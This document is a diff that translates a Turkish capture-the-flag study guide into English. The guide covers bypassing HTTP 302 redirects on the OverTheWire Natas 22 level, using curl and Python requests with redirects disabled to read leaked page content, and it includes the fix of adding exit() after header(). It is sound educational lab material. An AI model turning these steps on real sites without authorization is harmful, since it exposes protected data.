@@ -1,35 +1,35 @@
-# 🌐 Web Güvenliği — HTTP Redirect Bypass
+# 🌐 Web Security — HTTP Redirect Bypass
 
-> Sunucu seni başka bir sayfaya yönlendiriyor.
-> Ama yönlendirmeden önce bir şeyler söylüyor — tarayıcın onu göstermiyor.
+> The server redirects you to another page.
+> But before redirecting, it says something — your browser just doesn't show it.
 
 ---
 
-## 📋 İçindekiler
+## 📋 Table of Contents
 
-- [HTTP Redirect Nasıl Çalışır?](#http-redirect-nasıl-çalışır)
+- [How Does HTTP Redirect Work?](#how-does-http-redirect-work)
 - [302 Response Body](#302-response-body)
-- [Redirect'i Takip Etmeme](#redirecti-takip-etmeme)
-- [Natas'ta Kullanım](#natasta-kullanım)
+- [Not Following the Redirect](#not-following-the-redirect)
+- [Usage in Natas](#usage-in-natas)
 
 ---
 
-## HTTP Redirect Nasıl Çalışır?
+## How Does HTTP Redirect Work?
 
-Sunucu 301 veya 302 status kodu ile birlikte `Location` header'ı döndürdüğünde tarayıcı otomatik olarak yeni URL'e gider.
+When the server returns a `Location` header along with a 301 or 302 status code, the browser automatically goes to the new URL.
 
 ```
-Tarayıcı → GET /secret.php
-Sunucu   → HTTP/1.1 302 Found
-             Location: /login.php
-Tarayıcı → GET /login.php   (otomatik yönlendi)
+Browser → GET /secret.php
+Server  → HTTP/1.1 302 Found
+            Location: /login.php
+Browser → GET /login.php   (redirected automatically)
 ```
 
-Tarayıcı 302 response'undaki **body'yi göstermez** — direkt yeni URL'e gider.
+The browser **doesn't show the body** in a 302 response — it goes directly to the new URL.
 
-### 302 Response'un Body'si
+### The Body of the 302 Response
 
-Sunucu 302 döndürürken body de gönderebilir:
+When the server returns a 302, it can send a body too:
 
 ```
 HTTP/1.1 302 Found
@@ -38,62 +38,62 @@ Content-Type: text/html
 
 <html>
   <body>
-    The password for natas23 is: [ŞİFRE BURADA!]
+    The password for natas23 is: [PASSWORD HERE!]
   </body>
 </html>
 ```
 
-Tarayıcı bu body'yi göstermeden `/login.php`'ye gider. Ama body gerçekten gönderilmiştir — sadece tarayıcı işlemez.
+The browser goes to `/login.php` without showing this body. But the body really was sent — the browser just doesn't process it.
 
 ---
 
-## Redirect'i Takip Etmeme
+## Not Following the Redirect
 
-### curl ile
+### With curl
 
 ```bash
-# Varsayılan: curl redirect'i takip ETMEZ
-curl -u natas22:[şifre] http://natas22.natas.labs.overthewire.org/
-# 302 response'unun body'si görünür
+# Default: curl does NOT follow the redirect
+curl -u natas22:[password] http://natas22.natas.labs.overthewire.org/
+# The body of the 302 response is visible
 
-# -L ile redirect'i takip et (bu durumda body kaybolur)
-curl -L -u natas22:[şifre] http://natas22.natas.labs.overthewire.org/
+# Follow the redirect with -L (in this case the body is lost)
+curl -L -u natas22:[password] http://natas22.natas.labs.overthewire.org/
 ```
 
-### Python requests ile
+### With Python requests
 
 ```python
 import requests
 
-# allow_redirects=False → redirect'i takip etme
+# allow_redirects=False → don't follow the redirect
 r = requests.get(
     url,
     auth=(username, password),
     allow_redirects=False
 )
-print(r.text)   # 302 body'si
+print(r.text)   # the 302 body
 print(r.status_code)    # 302
-print(r.headers['Location'])    # Nereye yönlendirecekti
+print(r.headers['Location'])    # where it would have redirected
 ```
 
-### Burp Suite ile
+### With Burp Suite
 
-Burp tüm istekleri ve response'ları yakalar — redirect olsa bile 302 body'si Burp'te görünür.
+Burp captures all requests and responses — even if there's a redirect, the 302 body is visible in Burp.
 
 ---
 
-## Natas'ta Kullanım
+## Usage in Natas
 
-### Natas 22 — 302 Body'sinde Şifre
+### Natas 22 — Password in the 302 Body
 
-**Kaynak kod:**
+**Source code:**
 
 ```php
 <?php
 session_start();
 
 if(array_key_exists("revelio", $_GET)) {
-    // admin değilsen yönlendir
+    // if you're not an admin, redirect
     if(!($_SESSION and array_key_exists("admin", $_SESSION)
          and $_SESSION["admin"] == 1)) {
         header("Location: /");   // ← 302 redirect
@@ -102,22 +102,22 @@ if(array_key_exists("revelio", $_GET)) {
 ?>
 
 <?php
-    // Bu kod redirect'ten SONRA da çalışır!
+    // This code runs even AFTER the redirect!
     if(array_key_exists("revelio", $_GET)) {
         print "You are an admin. The password for natas23 is: <censored>";
     }
 ?>
 ```
 
-**Sorun:** PHP `header("Location: /")` ile redirect söyler ama kod çalışmaya devam eder. Şifre yine de HTML'e yazılır — sadece tarayıcı bunu göstermeden yönlendirir.
+**Problem:** PHP signals a redirect with `header("Location: /")` but the code keeps running. The password is written to the HTML anyway — the browser just redirects without showing it.
 
 **Exploit:**
 
 ```bash
-# curl ile redirect'i takip etme
-curl -u natas22:[şifre] \
+# Don't follow the redirect with curl
+curl -u natas22:[password] \
      "http://natas22.natas.labs.overthewire.org/?revelio"
-# Şifre body'de görünür
+# The password appears in the body
 ```
 
 ```python
@@ -125,7 +125,7 @@ import requests
 
 r = requests.get(
     "http://natas22.natas.labs.overthewire.org/?revelio",
-    auth=("natas22", "[şifre]"),
+    auth=("natas22", "[password]"),
     allow_redirects=False
 )
 print(r.text)
@@ -133,39 +133,39 @@ print(r.text)
 
 ---
 
-### Neden Oluyor?
+### Why Does This Happen?
 
-PHP'de `header()` ile redirect göndermek, kodun çalışmasını **durdurmaz**. Sonrasına `exit` veya `die` koymak gerekir:
+In PHP, sending a redirect with `header()` does **not** stop the code from running. You need to put `exit` or `die` after it:
 
 ```php
-// KÖTÜ — header sonra kod çalışmaya devam eder
+// BAD — code keeps running after header
 header("Location: /login.php");
-echo "Gizli içerik";   // Bu hâlâ çalışır!
+echo "Secret content";   // This still runs!
 
-// İYİ — header + exit
+// GOOD — header + exit
 header("Location: /login.php");
 exit();
 ```
 
 ---
 
-### HTTP Redirect — Kontrol Listesi
+### HTTP Redirect — Checklist
 
 ```
-Tespit:
-  ☐ Sayfa anında başka yere yönlendiriyor mu?
-  ☐ URL'de ?revelio, ?debug, ?show gibi parametre denenebilir mi?
-  ☐ Kaynak kodda header("Location:...") var mı?
+Detection:
+  ☐ Does the page redirect somewhere else instantly?
+  ☐ Can a parameter like ?revelio, ?debug, ?show be tried in the URL?
+  ☐ Is there a header("Location:...") in the source code?
 
 Exploit:
-  ☐ curl ile dene (varsayılan redirect takip etmez)
+  ☐ Try with curl (it doesn't follow redirects by default)
   ☐ Python requests → allow_redirects=False
-  ☐ Burp Suite → 302 response body'sini gör
+  ☐ Burp Suite → see the 302 response body
 ```
 
 ---
 
-## 🔗 Kaynaklar
+## 🔗 Resources
 
 - [MDN — HTTP 302](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/302)
 - [PortSwigger — Unvalidated Redirects](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
@@ -173,7 +173,7 @@ Exploit:
 
 ---
 
-**Önceki konu:** [15_session_ve_newline_injection.md](./15_session_ve_newline_injection.md)
-**Sonraki konu:** [17_php_type_juggling.md](./17_php_type_juggling.md)
+**Previous topic:** [15_session_and_newline_injection.md](./15_session_and_newline_injection.md)
+**Next topic:** [17_php_type_juggling.md](./17_php_type_juggling.md)
 
-*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
+*This guide is part of the [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) repository.*
